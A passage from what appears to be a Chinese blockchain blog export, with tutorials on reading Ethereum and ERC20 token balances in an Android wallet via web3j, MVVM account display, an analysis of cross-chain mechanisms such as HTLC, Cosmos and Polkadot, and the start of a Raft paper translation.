指的是以太币，Token 是大家通常所说的代币 或 通证，以太余额何Token余额，他们的获取方式是不一样的，明白这一点很重要，有必要先介绍下以太坊账户模型。 以太坊账户模型以太币Eth是以太坊的原生代币，在以太坊的账户模型中，有一个字段balance存储着余额，例如账号的定义像下面： 123456class Account &#123; nonce: &apos;0x01&apos;, balance: &apos;0x03e7&apos;, // wei stateRoot: &apos;0x56abc....&apos;, codeHash: &apos;0x56abc....&apos;, &#125; 获取以太币的余额只需要调用web3j提供的RPC接口eth_getBalance。 而一个地址的Token余额，他记录在Token合约上，注意合约其实也是一个账户（合约账户），Token是指符合ERC20标准的合约， 每个地址的余额通常存储在一个Mapping类型的balanceOf变量中，获取地址的余额需要调用合约的balanceOf方法，并给他传递地址作为参数。 如果在合约地址上调用 eth_getBalance， 获取的是合约上所存的 eth余额。 Token &amp; TokenInfo在登链代码里，每一种币及余额封装成了一个Token类，不论是以太币还是Token 都处理是一个Token实例。 这里Token 命名不是很严谨，以太币一般称为Coin，为了方便，Coin和Token 都统一作为Token处理，Coin 作为一个特殊的Token，了解这一点对后文阅读很重要。 Token的定义如下: 123456789101112public class Token &#123; public final TokenInfo tokenInfo; public final String balance; // 币余额 public String value; // 币对应的法币价值&#125;public class TokenInfo &#123; public final String address; // 合约地址 public final String name; public final String symbol; // 代币符号 public final int decimals;&#125; 账号所有资产资产包括以太币资产及Token资产。 关联 Token在获取账号余额之前，我们需要先知道有多少 Token 种类，然后再获取每种Token余额。在登链钱包中，每一账号在某个网络下所关联 Token种类，保存为一个 Realm文件，相关逻辑在RealmTokenSource类中。 Realm 是一个移动端数据库，是替代sqlite的一种解决方案。 在用户通过以下界面添加新资产，会调用RealmTokenSource类的put方法保存到.realm文件。 现在来看看如何获取账号所关联的 Token， 逻辑上比较简单，不过涉及了多个类，我把调用序列图梳理一下： sequenceDiagram Title: 获取账号Token种类 TokensViewModel->FetchTokensInteract: fetch FetchTokensInteract->TokenRepository: fetch TokenRepository->TokenLocalSource: fetch TokenLocalSource-->>TokensViewModel: OnTokens 通过这个调用过程，最终通过TokensViewModel类的onTokens获取到Token种类。 123 private void onTokens(Token[] tokens) &#123; this.tokens.postValue(tokens);&#125; 在PropertyFragmeng界面中订阅收到数据之后，把它设置到界面的Adapter里，完成Token列表的显示。 Ethplorer-API 服务TokenRepository在执行fetch方法时，如果是在主网下，会调用代码中EthplorerTokenService类，从第三方服务Ethplorer-API获取到获取到某一个地址所关联的所有的Token种类。 Ethplorer-API提供的API更多，不过我们只需要getAddressInfo接口，请求接口如下： 1/getAddressInfo/0xaccount?apiKey=freekey Ethplorer-API 的免费接口是有请求限额，每2秒才能发起一个请求，需要注意访问频度。 余额 balance获取以太余额分为两步： 先构造出web3j 对象 web3j 调用 ethGetBalance 获取以太余额 web3j对象的构造方法如下: 1web3j = Web3j.build(new HttpService(networkInfo.rpcServerUrl, httpClient, false)); web3j对象在TokenRepository初始化的时候完成，在TokenRepository获取到Token列表之后，如果是以太币会随即会调用getEthBalance 方法： 123456private BigDecimal getEthBalance(String walletAddress) throws Exception &#123; return new BigDecimal(web3j .ethGetBalance(walletAddress, DefaultBlockParameterName.LATEST) .send() .getBalance());&#125; 获取 Token 数量在TokenRepository获取到Token列表之后，如果是ERC20代币会随即会调用getBalance 方法。根据前面的介绍获取代币的余额需要调用合约的balanceOf方法，在以太坊上对合约方法的调用实际上会合约地址发起一个调用，调用的附加数据是函数及参数的ABI编码数据。 之前写过一篇文章：如何理解以太坊ABI， 大家可以读一下。 用以下方法构造出balanceOf的ABI函数类型： 123456private static org.web3j.abi.datatypes.Function balanceOf(String owner) &#123; return new org.web3j.abi.datatypes.Function( "balanceOf", Collections.singletonList(new Address(owner)), Collections.singletonList(new TypeReference&lt;Uint256&gt;() &#123;&#125;));&#125; 获取到balanceOf的ABI 之后，经过编码之后，使用 createEthCallTransaction来构造这样一个交易：交易的发起者是当前的账号，交易的目标地址是合约地址，附加数据是编码之后的数据，getBalance方法如下： 12345678910111213141516171819202122232425private BigDecimal getBalance(String walletAddress, TokenInfo tokenInfo) throws Exception &#123; org.web3j.abi.datatypes.Function function = balanceOf(walletAddress); String responseValue = callSmartContractFunction(function, tokenInfo.address, walletAddress); List&lt;Type&gt; response = FunctionReturnDecoder.decode( responseValue, function.getOutputParameters()); if (response.size() == 1) &#123; return new BigDecimal(((Uint256) response.get(0)).getValue()); &#125; else &#123; return null; &#125;&#125;private String callSmartContractFunction( org.web3j.abi.datatypes.Function function, String contractAddress, String walletAddress) throws Exception &#123; String encodedFunction = FunctionEncoder.encode(function); EthCall response = web3j.ethCall( Transaction.createEthCallTransaction(walletAddress, contractAddress, encodedFunction), DefaultBlockParameterName.LATEST) .sendAsync().get(); return response.getValue();&#125; 余额格式化上面获取到的余额，是以最小单位表示的一个数，如以太币余额用wei表示，而现示给用户的数据是ether，即大家说的以太。 注： 1 eth = 10^18 wei , 更多单位转换 转换方法如下： 12BigDecimal decimalDivisor = new BigDecimal(Math.pow(10, decimals));BigDecimal ethbalance = balance.divide(decimalDivisor); 对以太币而言 decimals 为 18，之后 ethbalance 会转化为一个保留4位小数点数的字符串保存到Token类型的balance变量，转换方法如下： 1ethBalance.setScale(4, RoundingMode.CEILING).toPlainString() UI界面最终通过订阅 tokens 数组获取Token种类及余额，代码查阅PropertyFragment.java 。 参考文档web3jRealmEthplorer-API 加我微信：xlbxiong 备注：钱包， 加入钱包开发的微信群。 加入知识星球，和一群优秀的区块链从业者一起学习。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>以太坊</category>
        <category>钱包</category>
      </categories>
      <tags>
        <tag>以太坊</tag>
        <tag>钱包</tag>
        <tag>Web3j</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发一款以太坊安卓钱包系列3 - 资产信息展示]]></title>
    <url>%2F2019%2F03%2F24%2Feth_wallet_dev_3%2F</url>
    <content type="text"><![CDATA[这是如何开发以太坊安卓钱包系列第3篇， 钱包账号资产信息展示，展示信息主要包括账号地址、eth余额及该账号所拥有的Token及余额。 预备知识 MVVM本文会涉及和UI界面的交互，提前理解下界面和数据如何交互是非常有必要的，如果你已经很熟悉MVVM，可跳过这一小节。 最早写Android的时候，数据和界面经常耦合在一起，一个Activity文件总是特别大，每当产品界面改版就非常痛苦，吐槽下，很多产品经理都喜欢对界面改来改去。 后来Google 推荐多个架构模式： MPV、 MVVM模式来解决数据和UI耦合的问题，登链钱包代码，使用的就是MVVM模式，所以对它做一个简单介绍，下面是MVVM的视图和数据的交互图： View 通常对应于Activity/Fragment/自定义ViewModel：则是和数据相关的模块。 View 与 Model 不直接发生联系， 而是通过ViewModel负责接收View层的事件以及获取并处理数据，ViewModel层的数据变化也会通知给View层进行相应的UI的更新，从而实现业务逻辑和Ui的隔离。 使用MVVM模式最大的优点就是解耦， 因为数据处理逻辑是独立于View, 在UI更改时，ViewModel 不用做太多改动。 我们使用了Google在I/O大会推出的一套遵循MVVM开发模式的LiveData和ViewModel组件架构。 ViewModel 和 LiveDataViewModel 会关注UI生命周期来存储和管理数据，在Activity发生变化（锁屏开屏、旋转）时，ViewModel 会自动保留之前的数据并给新的Activity或Fragment使用，当界面被系统销毁时，ViewModel也会进行资源清理，避免内存泄漏。 ViewModel 还可以用于不同界面间数据共享。 LiveData是一个可观察的数据持有者类。观察者可以方便我们以异步的方式获取数据，同时LiveData也是有生命周期感知的。如果其生命周期处于STARTED或RESUMED状态。LiveData会将观察者视为活动状态，并通知其数据的变化。LiveData未注册的观察对象以及非活动观察者是不会收到有关更新的通知。 了解更多，可自行以关键字： Lifecycle、ViewModel、LiveData 进行搜索。 账号信息展示展示信息主要包括账号地址、eth余额及该账号所拥有的Token及余额， 其界面效果如下: 这个界面应的是登链钱包的PropertyFragment，上图的UPT 是我自己发行的Token，所以没有显示价格 现在我们来思考一下， 怎么来展现上面的数据， 别着急往下看， 可以先想想。 先对问题做一个拆分，把数据拆分为4个部分： 显示当前选中的账号 显示当前账号 ETH 余额 显示当前账号下 Token 数量 显示对应的法币金额。 为了避免 UI 与上面4个数据的耦合，代码使用了一个TokensViewModel， 获取到的数据用 LiveData做了一个Wrap，以便UI可以订阅数据，TokensViewModel类像下面，代码有删减： 1234567public class TokensViewModel extends ViewModel &#123; private final MutableLiveData&lt;ETHWallet&gt; defaultWallet; private final MutableLiveData&lt;NetworkInfo&gt; defaultNetwork; private final MutableLiveData&lt;Token[]&gt; tokens; private final MutableLiveData&lt;Ticker&gt; prices;&#125; MutableLiveData 是前面提到的 LiveData的子类，在UI界面中就可以对数据进行订阅，下面我们逐一拆解下每个数据。 显示当前账号可以分为两个步骤： 从数据库中读取账号； 界面显示账号 TokensViewModel中定义了一个MutableLiveData&lt;ETHWallet&gt; defaultWallet ，从数据库中读取账号会保存在defaultWallet中，然后UI对 defaultWallet 进行观察显示。 注解: 登链钱包 里大量使用的这个方式，通过一个LiveData 做数据桥接。 在上一篇导入账号及账号管理，所有的账号使用greenDao 存储起来， 因此我们只需要把所有账号从加载出来，挑选出当前选中的那一个。 结合代码看一看： WalletDaoUtils.java12345678910public static ETHWallet getCurrent() &#123; List&lt;ETHWallet&gt; ethWallets = ethWalletDao.loadAll(); for (ETHWallet ethwallet : ethWallets) &#123; if (ethwallet.isCurrent()) &#123; ethwallet.setCurrent(true); return ethwallet; &#125; &#125; return null;&#125; 上面代码先用 ETHWalletDao.loadAll 加载出所有的账号，返回当前选中的，上面的代码会被FetchWalletInteract 类的 findDefault方法调用，在ViewModle里，很多时候以数据进行交互的类，我们会命名为 xxxInteract，这也是一个习惯用法。 其代码如下： FetchWalletInteract.java1234567891011// 返回一个可订阅的Single&lt;ETHWallet&gt; 对象public Single&lt;ETHWallet&gt; findDefault() &#123; return Single.fromCallable(() -&gt; &#123; return WalletDaoUtils.getCurrent(); &#125;).subscribe(this::onDefaultWallet); &#125; // 获取到默认钱包账号 设置到 defaultWallet 这个LiveData private void onDefaultWallet(ETHWallet wallet) &#123; defaultWallet.setValue(wallet); &#125; findDefault()返回一个可订阅的Single 对象，如果不熟悉可参考后面的文档。 之后，在UI界面PropertyFragment.java 中， 就可以对 defaultWallet 进行订阅： 1tokensViewModel.defaultWallet().observe(this, this::showWallet); 当获取到默认账号时，就会回调showWallet: 123456// UI 显示 public void showWallet(ETHWallet wallet) &#123; tvWalletName.setText(wallet.getName()); tvWalletAddress.setText(wallet.getAddress()); &#125; 这样， 界面的显示就完成了，下一篇继续介绍获取余额。 参考文档 lifecycle官方文档地址 RxAndroid 了解更多响应式编程 我创建了一个专门讨论钱包开发的微信群，加微信：xlbxiong 备注：钱包。 加入知识星球，和一群优秀的区块链从业者一起学习。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>以太坊</category>
        <category>钱包</category>
      </categories>
      <tags>
        <tag>以太坊</tag>
        <tag>钱包</tag>
        <tag>Web3j</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨链技术的分析和思考]]></title>
    <url>%2F2019%2F03%2F23%2Fblockchain_interoperability%2F</url>
    <content type="text"><![CDATA[当前的区块链底层技术平台百花齐放，不同的业务、不同的技术底层的区块链之间缺乏统一的互联互通的机制，这极大限制了区块链技术和应用生态的健康发展。跨链的需求由此而来，本文通过分析几种主流的跨链方案探讨跨链技术的本质及相应的解决思路。 跨链的类型跨链交互根据所跨越的区块链底层技术平台的不同可以分为同构链跨链和异构链跨链：同构链之间安全机制、共识算法、网络拓扑、区块生成验证逻辑都一致，它们之间的跨链交互相对简单。而异构链的跨链交互相对复杂，比如比特币采用PoW算法而联盟链Fabric采用传统确定性共识算法，其区块的组成形式和确定性保证机制均有很大不同，直接跨链交互机制不易设计。异构链之间的跨链交互一般需要第三方辅助服务辅助跨链交互。 主流跨链机制概述截至目前，主流的区块链跨链技术方案按照其具体的实现方式主要分为三大类，分别是公证人机制、侧链/中继和哈希锁定： 公证人机制（Notary schemes）: 公证人也称见证人机制，公证人机制本质上是一种中介的方式。具体而言，假设区块链A和B本身是不能直接进行互操作的，那么他们可以引入一个共同信任的第三方作为中介，由这个共同信任的中介进行跨链消息的验证和转发。公证人机制的优点在于能够灵活地支持各种不同结构的区块链（前提是公证人能够访问相关方的链上信息），缺点在于存在中心化风险。 哈希锁定（Hash-locking）: 哈希锁定技术主要是支持跨链中的原子资产交换，最早起源自比特币的闪电网络。其典型实现是哈希时间锁定合约HTLC(Hashed TimeLock Contract)。哈希锁定的原理是通过时间差和影藏哈希值来达到资产的原子交换。哈希锁定只能做到交换而不能做到资产或者信息的转移，因此其使用场景有限。 侧链/中继链（Sidechains / Relays）: 侧链是指完全拥有某链的功能的另一条区块链，侧链可以读取和验证主链上的信息。主链不知道侧链的存在，由侧链主动感知主链信息并进行相应的动作。而中继链则是侧链和公证人机制的结合体，中继链具有访问需要和验证进行互操作的链的关键信息并对两条链的跨链消息进行转移。从这个角度看中继链也是一种去中心的公证人机制。 下面就这几种跨链方式的典型实现方式进行详细分析： 典型跨链机制实现分析公证人机制最传统的公证人机制是基于中心化交易所得跨链资产交换，这种跨链的方式比较单一，只支持资产的交换，如下图演示了Alice通过交易所，用比特币和Bob交换ETH的过程。 Alice 通过交易所钱包将自己的比特币打入交易所地址; Alice 在交易所上挂上卖单1个BTC卖出20ETH价格； Bob需要将自己的ETH打入交易所的以太坊地址； Bob通过交易所挂出购买比特币的单子 20ETH买一个比特币； 交易所将Alice的卖单和Bob的卖单进行撮合； 交易所将Alice在交易所存储的1BTC 转移给Bob的比特币地址； 交易所将Bob在交易所存储的20ETH 转移给Alice的以太坊地址； 至此完成了Alice和Bob的BTC和ETH的交换（案例中省去了交易所的服务费）。通过该例子可以看出交易所的方式目前仅能够支持资产的交换，且资产交换的原子性、安全性完全由中心化的交易所保障存在较大的中心化风险。 除此之外还有一种著名的分布式账本技术Ripple，也是采用类似公证人的机制来解决全球金融机构之间的资产交换。Ripple的系统架构如上图所示，Ripple系统中交易通过网络中的验证者进行交易的验证，验证者验证的交易通过加密算法保护交易内容不能被验证着窥探从而保证交易的隐私性。 公证人机制的跨链技术实现简单，且能够比较灵活地支持不同类型的底层区块链体系。公证人机制的主要问题在于公证人机制的安全性保障完全由公证人系统保障。参与跨链的相关方需要对中间人给予较大的信任。 哈希锁定哈希时间锁定（HTLC）最早出现在比特币的闪电网络，跨链资产交换支持一定数量的A链资产和一定数量的B链资产进行原子交换。哈希时间锁定巧妙地采用了哈希锁和时间锁，迫使资产的接收方在deadline内确定收款并产生一种收款证明给打款人，否则资产会归还给打款人。收款证明能够被付款人用来获取接收人区块链上的等量价值的数量资产或触发其他事件。 如下图所示，我们用一个例子来阐述如何使用哈希时间锁定进行跨链的原子资产交换，假设Alice和Bob有资产交换的需求，Alice想用1个BTC和Bob换20个ETH. 那么首先需要在两条链上设置哈希时间锁定合约，然后执行如下步骤： Alice 随机构建一个字符串s，并计算出其哈希 h = hash(s)； Alice 将h发送给Bob的合约； Alice锁定自己的1个BTC资产，并设置一个较长的锁定时间t1, 并设置了获取该BTC的一个条件：谁能够提供h的原始值s就可以得到该BTC; Bob观察到Alice 合约中锁定了一个BTC, 然后Bob锁定自己的20个ETH资产，并设置一个相对较短的锁定时间t2, t2 &lt; t1, Bob也设置了同样获取条件（谁提供h的原始值s就可以获取20个ETH）； Alice将自己最初生成的字符串s 发送到Bob的合约里取得了20个ETH; Bob观察到步骤5中Alice的s值，将其发送给Alice的合约成功获取1个BTC; 至此Alice和Bob完成了资产的交换。 从上述的过程我们可以看出哈希时间锁定合约有一些约束条件： 进行跨链资产交换的双方必须能够解析双方的合约内部数据，例如s，例如锁定资产的证明等； 哈希锁定的超时时间设置时需要保证存在时间差，这样在单方面作弊时另一方可以及时撤回自己的资产。 哈希锁定的思想运用在支付领域较多，例如闪电网络、雷电网络以及跨链资产转移协议Interledger等。但是哈希锁定目前看只适合偏资产或者关键数据的交换，甚至不支持转移因此其试用场景受限。 侧链/中继链侧链侧链是相对于主链而言的，最初的侧链提出是针对比特币做新特性的测试和研发。侧链相对主链而言能够验证和解析主链中的区块数据和账本数据。侧链实现的基础技术是双向锚定（Two-way Peg），通过双向锚定技术可以将数字资产在主链上进行锁定，同时将等价的资产在侧链中释放。相反当侧链中相关资产进行锁定时，主链上锚定的等价资产也可以被释放。 BTC-Relay是号称的史上第一个侧链，BTC-Relay是通过以太坊构建了一个比特币的侧面，运用以太坊的智能合约允许用户验证比特币的交易。这里我们仍然以Alice 1BTC和Bob的20ETH数字资产交换为例阐述相应原理： Bob将20ETH发送到BTCSwap的合约进行冻结；(该合约只要能够确认BTC网络上Bob接收到来自Alice 1BTC就自动将20ETH转给Alice) Alice 确认Bob冻结信息后，将1 BTC转给Bob比特币账户； BTC Relayer将比特币区块头推送到BTCSwap合约； Alice 接下来就可以调用relay tx; BTCSwap合约结合tx和BTC链的区块链进行SPV验证，验证通过则将20ETH转给Alice以太坊地址。 这种跨链的实现方式简单，但是BTC Relay需要额外的信任和维护成本，且智能合约内部的数据存储会有体积膨胀的问题。但是侧链的机制相对哈希锁定而言能够提供更多的跨链交互场景，侧链以及类SPV验证的思想适合所有跨链的场景。 中继链中继链本质上算是公证人机制和侧链机制的融合和扩展，目前社区内最活跃的两个跨链项目Cosmos 和 Polkadot 采用的都是基于中继链的多链多层架构，其中Cosmos目前支持的是跨链资产交互而Polkadot则宣称提供任意类型的跨链交互，具体实现还有待观察。 CosmosCosmos网络是一个多链混合的区块链网格结构，如下图所示，该网络中主要包括两种角色：Hub: 用于处理跨链交互的中继链；Zone: Cosmos中的平行链， Cosmos中平行链需要具备两个前提条件： 1. 快速确定性（fast finality）, 这个特性由共识算法保障，也就是说Cosmos的跨链不直接支持PoW等概率确定模型的区块链； 2. 强监管性（Sovereignty)：每个平行链都具有一组验证者能够决定其出块。 为了支持平行链之间的跨链互操作，Cosmos提出了一种跨链交互协议IBC(Inter-Blockchain Communication protocol), 并利用tendermint共识算法的即时确定性实现多个异构链之间的价值和数据传输。 首先我们以Chain A 到Chain B 转账10 token为例说明使用IBC的跨链交互： 1. 互相跟踪，也就是说如果A要和B进行跨链交易，那么A和B链需要分别运行相当于对方区块链的轻节点服务，这样互相可以实时接收到对方的区块头信息（方便后续执行类SPV验证）； 2. A链上初始化IBC协议，冻结相关资产10 token, 并生成相应的证明发送给B区块链； 3. B链接收到相应的IBC消息，通过A链的区块头信息确定A确实进行相应的资产冻结，然后B链会生成等价值10 token的资产。 以上是使用IBC协议的两个平行链直接进行跨链的基本过程，如果区块链很多，那么这种方式的两两跨链复杂度会呈现组合级别增加。因此Cosmos网络又引入了一种Hub的中继链，所有的平行链都通过IBC连接到Hub，让Hub辅助跨链交易的验证和转移，目前Cosmos实现了一个官方的Hub称为Cosmos Hub（如前图所示）。 如下图所示是Cosmos 网络的详细架构图，Cosmos为方便平行链开发提供了基本服务CosmosSDK包括：共识、网络以及IBC协议等，这样基于Cosmos SDK开发的子链之间都能够方便地互相交互。此外对于非Cosmos SDK 开发的区块链需要使用Peg Zone进行桥接，如图中的Ethereum。 笔者认为Cosmos为跨链带来的最大贡献在于IBC协议的设计，IBC协议提供了一种通用的跨链协议标准。IBC的设计使得跨链交易可以在多个Hub之间进行安全路由和转发，类似目前互联网的TCP/IP 协议。但是遗憾的是目前的Cosmos设计也只能够支持资产的跨链，而且由于不同区块链的业务不同其共识速率的不一致也会影响跨链交易有效性的证明。 PolkadotPolkadot也是一种集成平行链和中继链的多层多链架构，Polkadot区块链的整体架构图如下图所示，主要包含三种角色链和四种参与方： 三种链角色： 中继链（Relay chain）: 中继链位于Polkadot的体系的核心地位，主要是为整个系统提供统一的共识和安全性保障； 平行链（Parachain）: 在Polkadot中平行链负责具体的业务场景，平行链自身不具备区块的共识，它们将共识的职责渡让给了中继链，所有平行链共享来自中继链的安全保障，中继链是Polkadot组成的一部分； 桥接链：桥接链指的是非Polkadot体系之外的区块链，如Bitcoin, Ethereum， 这些区块链有自身的共识算法，它们通过不同的Bridge与Polkadot连接在一起进行跨链交互。 四种参与方： 验证者(Validator): 验证者负责Polkadot的网络出块，会运行一个中继链的客户端，在每一轮区块产生中会对其提名的平行链出的块进行核验。当平行链的跨都被他们的子验证者集合确定好之后，验证者们会将所有平行链区块头组装到中继链的区块并进行共识。 核验人(Collator): 帮助验证者收集、验证和提交备选平行链区块，维护了一个平行链的全节点。 钓鱼人(Fisherman):钓鱼人主要靠检举非法交易或者区块以获取收益； 提名人(Nominator): 拥有stake的相关方，维护和负责验证者的安全性。 Polkadot的特性包括两个，一个是共享安全性，一个是不需信任的跨链交互。这里的不需信任的跨链交互其实是和第一个特点共享安全性密切相关的，而且Polkadot的不需信任的跨链交互也主要是只其内部的平行链之间。 在Polkadot中如果parachain A 需要发送一笔交易到parachain B的过程如下： A链将跨链交易放到自己的engress(每个平行链有一个消息输出队列engress 和一个消息输入队列ingress); A链的Collator收集A链的普通交易以及跨链交易并提交给A链的验证者集合； A链的验证者集合验证成功，将本次A链的区块头信息以及A链的engress内信息提交到中继链上； 中继链运行共识算法进行区块确认以及跨链交易路由，中继链上的验证者会将A链的相应交易从A链的engress queue中移动到B链的ingress queue中。 B链执行区块，将ingress queue中相应交易执行并修改自身账本。 以上便是Polkadot跨链交易的主要步骤，由于所有平行链的共识同步发生（中继链区块示意图如下），因此跨链交易不会有诸如双花等安全性问题。 Polkadot 的平行链之间的跨链交换的安全性保障主要来自共享安全性这个特点，共享安全性使得跨链交易和普通交易同步发生也就不存在其他跨链场景中的双花等跨链数据不一致问题。其次Polkadot中的引入的特殊状态验证方法方便中继链进行跨链等消息的有效性验证。 值得一提的是Polkadot项目目前还处在项目初期，对于parachain的设计、Collator的协作以及Validator的共识、工作效率等都未完善。这种共享安全性的方式是否也限制了平行链自身的性能都还有待考证。 关于跨链技术的几点思考综合以上的一些主流跨链场景和方案的分析，从跨链的概念以及需求上看跨链的本质其实就是 如何将A链上的消息M安全可信地转移到B链并在B链上产生预期效果。那么一个成功的跨链交互到底需要解决哪些问题呢？笔者认为主要有以下四个问题： 消息M的真实性证明，也就是说M是否确实是存在A链上的，也确实是A链发给B链的； 消息M的路由，如何让跨链消息安全跨系统路由； 消息M的有效性证明，这里的有效性是指来自A链的消息M如何让B链认可其抵达B链时状态仍然有效，比如转移的资产是否是冻结的，没有双花的，如果是状态那么是否在此期间未发生改变等； 消息M的执行结果证明，这个是指A链需要确认跨链操作是否成功，以及成功操作的相应回执。 那么针对这些关键本质问题，如何去处理呢？笔者设想未来的区块链应该在底层平台的设计之初就需要遵循统一的跨链协议标准，就像现在的操作系统对TCP/IP协议的支持一样。需要进行通用跨链的区块链至少要支持一下功能： 提供跨链消息的输入和输出口径，例如Cosmos和Polkadot的跨链队列； 提供跨链消息的真实性证明，区块链需要提供类似SPV的证明手段； 消息的有效路由需要构建跨链消息的统一格式，定义好消息的来源和去处以及消息内容，如Cosmos的IBC协议； 消息的有效性证明，区块链可能需要设计新的类似UTXO的可验证存储结构，方便做类SPV类验证，否则目前的基于KV的数据存储方式做有效性证明几乎不可能； 跨链执行结果证明，和有效性证明类似，需要全新的数据结构和运行算法支持。 除此之外，跨链系统的设计还需要考虑系统稳定性、可扩展性以及易升级性、容错等等，总而言之，真正的可信互联网建设艰辛蛮长，诸君共勉！ 本文经作者授权转自BITKING 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>跨链</category>
      </categories>
      <tags>
        <tag>跨链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寻找一种易于理解的一致性算法（扩展版）]]></title>
    <url>%2F2019%2F03%2F22%2Feasy_raft%2F</url>
    <content type="text"><![CDATA[摘要 Raft 是一种为了管理复制日志的一致性算法。它提供了和 Paxos 算法相同的功能和性能，但是它的算法结构和 Paxos 不同，使得 Raft 算法更加容易理解并且更容易构建实际的系统。为了提升可理解性，Raft 将一致性算法分解成了几个关键模块，例如领导人选举、日志复制和安全性。同时它通过实施一个更强的一致性来减少需要考虑的状态的数量。从一个用户研究的结果可以证明，对于学生而言，Raft 算法比 Paxos 算法更加容易学习。Raft 算法还包括一个新的机制来允许集群成员的动态改变，它利用重叠的大多数来保证安全性。 1 介绍一致性算法允许一组机器像一个整体一样工作，即使其中一些机器出现故障也能够继续工作下去。正因为如此，一致性算法在构建可信赖的大规模软件系统中扮演着重要的角色。在过去的 10 年里，Paxos 算法统治着一致性算法这一领域：绝大多数的实现都是基于 Paxos 或者受其影响。同时 Paxos 也成为了教学领域里讲解一致性问题时的示例。 但是不幸的是，尽管有很多工作都在尝试降低它的复杂性，但是 Paxos 算法依然十分难以理解。并且，Paxos 自身的算法结构需要进行大幅的修改才能够应用到实际的系统中。这些都导致了工业界和学术界都对 Paxos 算法感到十分头疼。 和 Paxos 算法进行过努力之后，我们开始寻找一种新的一致性算法，可以为构建实际的系统和教学提供更好的基础。我们的做法是不寻常的，我们的首要目标是可理解性：我们是否可以在实际系统中定义一个一致性算法，并且能够比 Paxos 算法以一种更加容易的方式来学习。此外，我们希望该算法方便系统构建者的直觉的发展。不仅一个算法能够工作很重要，而且能够显而易见的知道为什么能工作也很重要。 Raft 一致性算法就是这些工作的结果。在设计 Raft 算法的时候，我们使用一些特别的技巧来提升它的可理解性，包括算法分解（Raft 主要被分成了领导人选举，日志复制和安全三个模块）和减少状态机的状态（相对于 Paxos，Raft 减少了非确定性和服务器互相处于非一致性的方式）。一份针对两所大学 43 个学生的研究表明 Raft 明显比 Paxos 算法更加容易理解。在这些学生同时学习了这两种算法之后，和 Paxos 比起来，其中 33 个学生能够回答有关于 Raft 的问题。 Raft 算法在许多方面和现有的一致性算法都很相似（主要是 Oki 和 Liskov 的 Viewstamped Replication），但是它也有一些独特的特性： 强领导者：和其他一致性算法相比，Raft 使用一种更强的领导能力形式。比如，日志条目只从领导者发送给其他的服务器。这种方式简化了对复制日志的管理并且使得 Raft 算法更加易于理解。 领导选举：Raft 算法使用一个随机计时器来选举领导者。这种方式只是在任何一致性算法都必须实现的心跳机制上增加了一点机制。在解决冲突的时候会更加简单快捷。 成员关系调整：Raft 使用一种共同一致的方法来处理集群成员变换的问题，在这种方法下，处于调整过程中的两种不同的配置集群中大多数机器会有重叠，这就使得集群在成员变换的时候依然可以继续工作。 我们相信，Raft 算法不论出于教学目的还是作为实践项目的基础都是要比 Paxos 或者其他一致性算法要优异的。它比其他算法更加简单，更加容易理解；它的算法描述足以实现一个现实的系统；它有好多开源的实现并且在很多公司里使用；它的安全性已经被证明；它的效率和其他算法比起来也不相上下。 接下来，这篇论文会介绍以下内容：复制状态机问题（第 2 节），讨论 Paxos 的优点和缺点（第 3 节），讨论我们为了可理解性而采取的方法（第 4 节），阐述 Raft 一致性算法（第 5-8 节），评价 Raft 算法（第 9 节），以及一些相关的工作（第 10 节）。 2 复制状态机一致性算法是从复制状态机的背景下提出的（参考英文原文引用37）。在这种方法中，一组服务器上的状态机产生相同状态的副本，并且在一些机器宕掉的情况下也可以继续运行。复制状态机在分布式系统中被用于解决很多容错的问题。例如，大规模的系统中通常都有一个集群领导者，像 GFS、HDFS 和 RAMCloud，典型应用就是一个独立的的复制状态机去管理领导选举和存储配置信息并且在领导人宕机的情况下也要存活下来。比如 Chubby 和 ZooKeeper。 图 1 ：复制状态机的结构。一致性算法管理着来自客户端指令的复制日志。状态机从日志中处理相同顺序的相同指令，所以产生的结果也是相同的。 复制状态机通常都是基于复制日志实现的，如图 1。每一个服务器存储一个包含一系列指令的日志，并且按照日志的顺序进行执行。每一个日志都按照相同的顺序包含相同的指令，所以每一个服务器都执行相同的指令序列。因为每个状态机都是确定的，每一次执行操作都产生相同的状态和同样的序列。 保证复制日志相同就是一致性算法的工作了。在一台服务器上，一致性模块接收客户端发送来的指令然后增加到自己的日志中去。它和其他服务器上的一致性模块进行通信来保证每一个服务器上的日志最终都以相同的顺序包含相同的请求，尽管有些服务器会宕机。一旦指令被正确的复制，每一个服务器的状态机按照日志顺序处理他们，然后输出结果被返回给客户端。因此，服务器集群看起来形成一个高可靠的状态机。 实际系统中使用的一致性算法通常含有以下特性： 安全性保证（绝对不会返回一个错误的结果）：在非拜占庭错误情况下，包括网络延迟、分区、丢包、冗余和乱序等错误都可以保证正确。 可用性：集群中只要有大多数的机器可运行并且能够相互通信、和客户端通信，就可以保证可用。因此，一个典型的包含 5 个节点的集群可以容忍两个节点的失败。服务器被停止就认为是失败。他们当有稳定的存储的时候可以从状态中恢复回来并重新加入集群。 不依赖时序来保证一致性：物理时钟错误或者极端的消息延迟只有在最坏情况下才会导致可用性问题。 通常情况下，一条指令可以尽可能快的在集群中大多数节点响应一轮远程过程调用时完成。小部分比较慢的节点不会影响系统整体的性能。 3 Paxos 算法的问题在过去的 10 年里，Leslie Lamport 的 Paxos 算法几乎已经成为一致性的代名词：Paxos 是在课程教学中最经常使用的算法，同时也是大多数一致性算法实现的起点。Paxos 首先定义了一个能够达成单一决策一致的协议，比如单条的复制日志项。我们把这一子集叫做单决策 Paxos。然后通过组合多个 Paxos 协议的实例来促进一系列决策的达成。Paxos 保证安全性和活性，同时也支持集群成员关系的变更。Paxos 的正确性已经被证明，在通常情况下也很高效。 不幸的是，Paxos 有两个明显的缺点。第一个缺点是 Paxos 算法特别的难以理解。完整的解释是出了名的不透明；通过极大的努力之后，也只有少数人成功理解了这个算法。因此，有了几次用更简单的术语来解释 Paxos 的尝试。尽管这些解释都只关注了单决策的子集问题，但依然很具有挑战性。在 2012 年 NSDI 的会议中的一次调查显示，很少有人对 Paxos 算法感到满意，甚至在经验老道的研究者中也是如此。我们自己也尝试去理解 Paxos；我们一直没能理解 Paxos 直到我们读了很多对 